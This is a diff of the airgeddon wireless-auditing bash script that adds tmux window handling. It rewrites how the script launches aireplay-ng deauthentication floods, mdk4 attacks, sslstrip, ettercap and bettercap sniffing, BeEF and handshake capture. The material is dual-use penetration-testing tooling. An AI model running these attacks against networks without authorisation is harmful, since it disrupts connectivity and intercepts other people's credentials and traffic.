+		get_tmux_process_id "bash \"${tmpdir}${control_et_file}\""
+		et_process_control_window="${global_process_pid}"
+		global_process_pid=""
+	fi
 }
 
 #Create configuration file for lighttpd
@@ -9162,8 +9654,14 @@ function launch_webserver() {
 	else
 		lighttpd_window_position=${g4_bottomright_window}
 	fi
-	xterm -hold -bg black -fg yellow -geometry "${lighttpd_window_position}" -T "Webserver" -e "lighttpd -D -f \"${tmpdir}${webserver_file}\"" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "lighttpd -D -f \"${tmpdir}${webserver_file}\""
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
 }
 
 #Launch sslstrip for sslstrip sniffing Evil Twin attack
@@ -9173,8 +9671,14 @@ function launch_sslstrip() {
 
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "Sslstrip" -e "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"Sslstrip\"" "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" "Sslstrip"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
 }
 
 #Launch ettercap sniffer
@@ -9196,8 +9700,14 @@ function launch_ettercap_sniffing() {
 		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
 	fi
 
-	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer" -e "${ettercap_cmd}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer\"" "${ettercap_cmd}" "Sniffer"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "${ettercap_cmd}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
 }
 
 #Create configuration file for beef
@@ -9303,6 +9813,7 @@ function set_beef_config() {
 }
 
 #Kill beef process
+#shellcheck disable=SC2009
 function kill_beef() {
 
 	debug_print
@@ -9489,11 +10000,25 @@ function launch_beef() {
 	if [ "${beef_found}" -eq 1 ]; then
 		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
 		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
-		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "cd ${beef_path} && ./beef -c \"${beef_file}\"" > /dev/null 2>&1 &
+		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "cd ${beef_path} && ./beef -c \"${beef_file}\"" "BeEF"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+			get_tmux_process_id "cd ${beef_path} && ./beef -c \"${beef_file}\""
+			et_processes+=("${global_process_pid}")
+			global_process_pid=""
+		fi
 	else
-		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "${optional_tools_names[19]}" > /dev/null 2>&1 &
+		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[19]}" "BeEF"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+			get_tmux_process_id "{optional_tools_names[19]}"
+			et_processes+=("${global_process_pid}")
+			global_process_pid=""
+		fi
 	fi
-	et_processes+=($!)
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	fi
+
 	sleep 2
 }
 
@@ -9515,8 +10040,14 @@ function launch_bettercap_sniffing() {
 		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
 	fi
 
-	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer+Bettercap-Sslstrip2/BeEF" -e "${bettercap_cmd}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer+Bettercap-Sslstrip2/BeEF\"" "${bettercap_cmd}" "Sniffer+Bettercap-Sslstrip2/BeEF"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		get_tmux_process_id "${bettercap_cmd}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	else
+		et_processes+=($!)
+	fi
 }
 
 #Parse ettercap log searching for captured passwords
@@ -9663,11 +10194,14 @@ function kill_et_windows() {
 	done
 
 	if [ -n "${enterprise_mode}" ]; then
-		kill ${enterprise_process_control_window} &> /dev/null
+		kill "${enterprise_process_control_window}" &> /dev/null
 		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
 	else
-		kill ${et_process_control_window} &> /dev/null
+		kill "${et_process_control_window}" &> /dev/null
 		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+	fi
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
 	fi
 }
 
@@ -9952,25 +10486,46 @@ function capture_handshake_evil_twin() {
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"mdk4 amok attack\"" "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
+				processidattack="${global_process_pid}"
+				global_process_pid=""
+			fi
 			sleeptimeattack=12
 		;;
 		"Aireplay")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+				processidattack="${global_process_pid}"
+				global_process_pid=""
+			fi
 			sleeptimeattack=12
 		;;
 		"Wds Confusion")
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface} w -e ${essid} -c ${channel}"
+				processidattack="${global_process_pid}"
+				global_process_pid=""
+			fi
 			sleeptimeattack=16
 		;;
 	esac
 
-	processidattack=$!
-	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		processidattack=$!
+		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	else
+		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
+	fi
+
 	handshake_capture_check
+
 	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent"; then
 
 		handshakepath="${default_save_path}"
@@ -10419,7 +10974,12 @@ function attack_handshake_menu() {
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"mdk4 amok attack\"" "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
 				sleeptimeattack=12
 			fi
 		;;
@@ -10432,7 +10992,12 @@ function attack_handshake_menu() {
 				capture_handshake_window
 				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
 				sleeptimeattack=12
 			fi
 		;;
@@ -10444,7 +11009,12 @@ function attack_handshake_menu() {
 				ask_timeout "capture_handshake"
 				capture_handshake_window
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "mdk4 ${interface} w -e ${essid} -c ${channel}"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
 				sleeptimeattack=16
 			fi
 		;;
@@ -10454,8 +11024,12 @@ function attack_handshake_menu() {
 		;;
 	esac
 
-	processidattack=$!
-	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		processidattack=$!
+		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	else
+		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
+	fi
 
 	attack_handshake_menu "handshake"
 }
@@ -10475,8 +11049,14 @@ function capture_handshake_window() {
 
 	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
 	recalculate_windows_sizes
-	xterm +j -sb -rightbar -geometry "${g1_topright_window}" -T "Capturing Handshake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${tmpdir}handshake" "${interface}" > /dev/null 2>&1 &
-	processidcapture=$!
+	manage_output "+j -sb -rightbar -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}"
+		processidcapture="${global_process_pid}"
+		global_process_pid=""
+	else
+		processidcapture=$!
+	fi
 }
 
 #Manage target exploration and parse the output files
@@ -10514,8 +11094,10 @@ function explore_for_targets_option() {
 				fi
 			;;
 		esac
+		cypher_cmd=" --encrypt ${cypher_filter} "
 	else
 		cypher_filter=""
+		cypher_cmd=" "
 		language_strings "${language}" 366 "yellow"
 	fi
 	language_strings "${language}" 115 "read"
@@ -10531,7 +11113,8 @@ function explore_for_targets_option() {
 	fi
 
 	recalculate_windows_sizes
-	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for targets" -e airodump-ng -w "${tmpdir}nws" --encrypt "${cypher_filter}" "${interface}" --band "${airodump_band_modifier}" > /dev/null 2>&1
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for targets\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
+	wait_for_process "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets"
 	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' < "${tmpdir}nws-01.csv")
 	targetline=$((targetline - 1))
 
@@ -10630,11 +11213,11 @@ function explore_for_wps_targets_option() {
 	wash_band_modifier=""
 	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]; then
 		if check_dual_scan_on_wash; then
-			wash_band_modifier="-2 -5"
+			wash_band_modifier=" -2 -5"
 		else
 			ask_yesno 145 "no"
 			if [ "${yesno}" = "y" ]; then
-				wash_band_modifier="-5"
+				wash_band_modifier=" -5"
 			fi
 		fi
 	fi
@@ -10647,7 +11230,8 @@ function explore_for_wps_targets_option() {
 	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
 
 	recalculate_windows_sizes
-	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for WPS targets" -e "wash -i \"${interface}\" ${wash_ifaces_already_set[${interface}]} ${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" > /dev/null 2>&1
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for WPS targets\"" "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" "Exploring for WPS targets" "active"
+	wait_for_process "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier}" "Exploring for WPS targets"
 
 	readarray -t WASH_PREVIEW < <(cat < "${tmpdir}wps.txt" 2> /dev/null)
 
@@ -10906,7 +11490,7 @@ function set_wash_parameterization() {
 
 	for item in "${WASH_OUTPUT[@]}"; do
 		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
-			fcs="-C"
+			fcs=" -C "
 			break
 		fi
 	done
@@ -11610,7 +12194,11 @@ function capture_traps() {
 				esac
 			;;
 			SIGINT|SIGHUP)
-				hardcore_exit
+				if [ "${no_hardcore_exit}" -eq 0 ]; then
+					hardcore_exit
+				else
+					exit ${exit_code}
+				fi
 			;;
 		esac
 	else
@@ -11687,10 +12275,15 @@ function exit_script_option() {
 		language_strings "${language}" 160 "yellow"
 	fi
 
-	clean_env_vars
-
 	echo
-	exit ${exit_code}
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		clean_env_vars
+		no_hardcore_exit=1
+		kill_tmux_session "${session_name}" > /dev/null
+	else
+		clean_env_vars
+		exit ${exit_code}
+	fi
 }
 
 #Exit the script managing possible pending tasks but not showing anything
@@ -11727,9 +12320,13 @@ function hardcore_exit() {
 		echo -e "${green_color} Ok\r${normal_color}"
 	fi
 
-	clean_env_vars
-
-	exit ${exit_code}
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		clean_env_vars
+		kill_tmux_session "${session_name}"
+	else
+		clean_env_vars
+		exit ${exit_code}
+	fi
 }
 
 #Generate a small time loop printing some dots
@@ -11913,6 +12510,17 @@ function validate_reaver_pixiewps_version() {
 	debug_print
 
 	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_pixiewps_version}"; then
+		return 0
+	fi
+	return 1
+}
+
+#Validate if reaver version is able to perform null pin attack
+function validate_reaver_nullpin_version() {
+
+	debug_print
+
+	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_nullpin_version}"; then
 		return 0
 	fi
 	return 1
@@ -12795,6 +13403,7 @@ function initialize_script_settings() {
 	secondary_interface_airmon_compatible=1
 	declare -gA wps_data_array
 	declare -gA interfaces_band_info
+	tmux_error=0
 }
 
 #Detect if there is a working X window system excepting for docker container and wayland
@@ -12938,6 +13547,7 @@ function recalculate_windows_sizes() {
 }
 
 #Initialization of env vars
+#shellcheck disable=SC2145
 function env_vars_initialization() {
 
 	debug_print
@@ -12954,7 +13564,13 @@ function env_vars_initialization() {
 									"AIRGEDDON_FORCE_IPTABLES"
 									"AIRGEDDON_DEVELOPMENT_MODE"
 									"AIRGEDDON_DEBUG_MODE"
+									"AIRGEDDON_WINDOWS_HANDLING"
 									)
+
+	declare -gA nonboolean_options_env_vars
+	nonboolean_options_env_vars["${ordered_options_env_vars[11]},default_value"]="xterm"
+
+	nonboolean_options_env_vars["${ordered_options_env_vars[11]},rcfile_text"]="#Available values: xterm, tmux - Define the needed tool to be used for windows handling - Default value xterm"
 
 	declare -gA boolean_options_env_vars
 	boolean_options_env_vars["${ordered_options_env_vars[0]},default_value"]="true"
@@ -12981,8 +13597,12 @@ function env_vars_initialization() {
 	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[10]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[10]},'default_value']}"
 
-	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
-	ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
+	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]} ${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
+	readarray -t ENV_BOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
+	readarray -t ENV_NONBOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
+	ARRAY_ENV_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
+	ARRAY_ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_BOOLEAN_VARS_ELEMENTS[@]}")
+	ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS=("${ENV_NONBOOLEAN_VARS_ELEMENTS[@]}")
 
 	if [ ! -f "${scriptfolder}${rc_file}" ]; then
 		create_rcfile
@@ -12998,23 +13618,47 @@ function env_vars_values_validation() {
 
 	declare -gA errors_on_configuration_vars
 
-	for item in "${ENV_VARS_ELEMENTS[@]}"; do
+	for item in "${ARRAY_ENV_VARS_ELEMENTS[@]}"; do
 		if [ -z "${!item}" ]; then
 			if grep "${item}" "${scriptfolder}${rc_file}" > /dev/null; then
 				eval "export $(grep "${item}" "${scriptfolder}${rc_file}")"
 			else
-				export ${item}=${boolean_options_env_vars["${item}",'default_value']}
-				errors_on_configuration_vars["${item},missing_var"]="${boolean_options_env_vars[${item},'default_value']}"
+				if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
+					export ${item}=${boolean_options_env_vars["${item}",'default_value']}
+					errors_on_configuration_vars["${item},missing_var"]="${boolean_options_env_vars[${item},'default_value']}"
+				elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
+					export ${item}=${nonboolean_options_env_vars["${item}",'default_value']}
+					errors_on_configuration_vars["${item},missing_var"]="${nonboolean_options_env_vars[${item},'default_value']}"
+				fi
 			fi
 		fi
 	done
 
-	for item in "${ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
+	for item in "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
 		if ! [[ "${!item,,}" =~ ^(true|false)$ ]]; then
 			errors_on_configuration_vars["${item},invalid_value"]="${boolean_options_env_vars[${item},'default_value']}"
 			export ${item}=${boolean_options_env_vars["${item}",'default_value']}
 		fi
 	done
+
+	for item in "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}"; do
+		if [ "${item}" = "AIRGEDDON_WINDOWS_HANDLING" ]; then
+			if ! [[ "${!item,,}" =~ ^(xterm|tmux)$ ]]; then
+				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
+				export ${item}=${nonboolean_options_env_vars["${item}",'default_value']}
+			fi
+		fi
+	done
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		if hash tmux 2> /dev/null; then
+			transfer_to_tmux
+			if ! check_inside_tmux; then
+				exit_code=1
+				exit ${exit_code}
+			fi
+		fi
+	fi
 }
 
 #Print possible issues on configuration vars
@@ -13060,10 +13704,18 @@ function create_rcfile() {
 	local counter=0
 	for item in "${ordered_options_env_vars[@]}"; do
 		counter=$((counter + 1))
-		if [ -n "${ENV_BOOLEAN_VARS_ELEMENTS[${item}]}" ]; then
+		if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
 			{
 			echo -e "${boolean_options_env_vars[${item},"rcfile_text"]}"
 			echo -e "${item}=${boolean_options_env_vars[${item},"default_value"]}"
+			if [ ${counter} -ne ${#ordered_options_env_vars[@]} ]; then
+				echo -ne "\n"
+			fi
+			} >> "${scriptfolder}${rc_file}" 2> /dev/null
+		elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
+			{
+			echo -e "${nonboolean_options_env_vars[${item},"rcfile_text"]}"
+			echo -e "${item}=${nonboolean_options_env_vars[${item},"default_value"]}"
 			if [ ${counter} -ne ${#ordered_options_env_vars[@]} ]; then
 				echo -ne "\n"
 			fi
@@ -13134,6 +13786,224 @@ function initialize_colors() {
 	white_color="\e[1;97m"
 }
 
+#Kill tmux session started by airgeddon
+function kill_tmux_session() {
+
+	debug_print
+
+	tmux kill-session -t "${1}"
+}
+
+#Starting point of airgeddon script inside newly created tmux session
+function start_airgeddon_from_tmux() {
+
+	debug_print
+
+	tmux rename-window -t "${session_name}" "${tmux_main_window}"
+	tmux send-keys -t "${session_name}:${tmux_main_window}" "clear;bash ${scriptfolder}${scriptname}" ENTER
+	sleep 0.2
+	if [ "${1}" = "normal" ]; then
+		tmux attach -t "${session_name}"
+	else
+		tmux switch-client -t "${session_name}"
+	fi
+}
+
+#Create new tmux session exclusively for airgeddon
+function create_tmux_session() {
+
+	debug_print
+
+	session_name="${1}"
+
+	if [ "${2}" = "true" ]; then
+		tmux new-session -d -s "${1}"
+		start_airgeddon_from_tmux "normal"
+	else
+		tmux new-session -d -s "${1}"
+		start_airgeddon_from_tmux "nested"
+	fi
+}
+
+#Start supporting scripts inside its own tmux window
+function start_tmux_processes() {
+
+	debug_print
+
+	local window_name
+	local command_line
+
+	window_name="${1}"
+	command_line="${2}"
+
+	tmux kill-window -t "${session_name}:${window_name}" 2> /dev/null
+	case "${4}" in
+		"active")
+			tmux new-window -t "${session_name}:" -n "${window_name}"
+		;;
+		*)
+			tmux new-window -d -t "${session_name}:" -n "${window_name}"
+		;;
+	esac
+	local tmux_color_cmd
+	if [ -n "${3}" ]; then
+		tmux_color_cmd="bg=#000000 fg=${3}"
+	else
+		tmux_color_cmd="bg=#000000"
+	fi
+	tmux setw -t "${window_name}" window-style "${tmux_color_cmd}"
+	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
+}
+
+#Check if script is currently executed inside tmux session or not
+function check_inside_tmux() {
+
+	debug_print
+
+	local parent_pid
+	local parent_window
+	parent_pid=$(ps -o ppid= ${PPID} | tr -d ' ')
+	parent_window="$(ps --no-headers -p "${parent_pid}" -o comm=)"
+	if [[ "${parent_window}" =~ tmux ]]; then
+		return 0
+	fi
+	return 1
+}
+
+#Close any existing tmux session before opening, to avoid conflicts
+#shellcheck disable=SC2009
+function close_existing_airgeddon_tmux_session() {
+
+	debug_print
+
+	if ! check_inside_tmux; then
+		eval "kill -9 $(ps --no-headers aux | grep -i 'tmux.*airgeddon' | awk '{print $2}' | tr '\n' ' ') > /dev/null 2>&1"
+	fi
+}
+
+#Hand over script execution to tmux and call function to create a new session
+function transfer_to_tmux() {
+
+	debug_print
+
+	close_existing_airgeddon_tmux_session
+
+	if ! check_inside_tmux; then
+		create_tmux_session "${session_name}" "true"
+	else
+		local active_session
+		active_session=$(tmux display-message -p '#S')
+		if [ "${active_session}" != "${session_name}" ]; then
+			tmux_error=1
+		fi
+	fi
+}
+
+#Function to kill tmux windows using window name
+function kill_tmux_windows() {
+
+	debug_print
+
+	local TMUX_WINDOWS_LIST=()
+	local current_window_name
+	readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+	for item in "${TMUX_WINDOWS_LIST[@]}"; do
+		[[ "${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="${BASH_REMATCH[1]}"
+		if [ "${current_window_name}" = "${tmux_main_window}" ]; then
+			continue
+		fi
+		if [ -n "${1}" ]; then
+			if [ "${current_window_name}" = "${1}" ]; then
+				continue
+			fi
+		fi
+		tmux kill-window -t "${session_name}:${current_window_name}"
+	done
+}
+
+#Function to pause script execution on the main window until a process has finished executing or the user terminates it
+#shellcheck disable=SC2009
+function wait_for_process() {
+
+	debug_print
+
+	local running_process
+	local running_process_pid
+	local running_process_cmd_line
+	running_process_cmd_line=$(echo "${1}" | tr -d '"')
+
+	while [ -z "${running_process_pid}" ]; do
+		running_process_pid=$(ps --no-headers aux | grep "${running_process_cmd_line}" | grep -v "grep ${running_process_cmd_line}" | awk '{print $2}' | tr '\n' ':')
+		if [ -n "${running_process_pid}" ]; then
+			running_process_pid="${running_process_pid%%:*}"
+			running_process="${running_process_pid}"
+		fi
+	done
+
+	while [ -n "${running_process}" ]; do
+		running_process=$(ps aux | grep "${running_process_pid}" | grep -v "grep ${running_process_pid}")
+		sleep 0.2
+	done
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		tmux kill-window -t "${session_name}:${2}"
+	fi
+}
+
+#Function to capture PID of a process started inside tmux and setting it to a global variable
+#shellcheck disable=SC2009
+function get_tmux_process_id() {
+
+	debug_print
+
+	local process_pid
+	local process_cmd_line
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		process_cmd_line=$(echo "${1}" | tr -d '"')
+		while [ -z "${process_pid}" ]; do
+			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
+		done
+		global_process_pid="${process_pid}"
+	fi
+}
+
+#Centralized function to launch window using xterm/tmux
+function manage_output() {
+
+	debug_print
+
+	local xterm_parameters
+	local tmux_command_line
+	local xterm_command_line
+	local window_name
+	local command_tail
+
+	xterm_parameters="${1}"
+	tmux_command_line="${2}"
+	xterm_command_line="\"${2}\""
+	window_name="${3}"
+	command_tail=" > /dev/null 2>&1 &"
+
+	case "${AIRGEDDON_WINDOWS_HANDLING}" in
+		"tmux")
+			local tmux_color
+			tmux_color=""
+			[[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
+			case "${4}" in
+				"active")
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
+				;;
+				*)
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
+				;;
+			esac
+		;;
+		"xterm")
+			eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
+		;;
+	esac
+}
+
 #Script starting point
 function main() {
 
@@ -13156,8 +14026,26 @@ function main() {
 
 	check_language_strings
 
-	check_xwindow_system
-	detect_screen_resolution
+	if [ ${tmux_error} -eq 1 ]; then
+		language_strings "${language}" 86 "title"
+		echo
+		language_strings "${language}" 621 "yellow"
+		language_strings "${language}" 115 "read"
+		create_tmux_session "${session_name}" "false"
+
+		exit_code=1
+		exit ${exit_code}
+	fi
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		check_xwindow_system
+		detect_screen_resolution
+	else
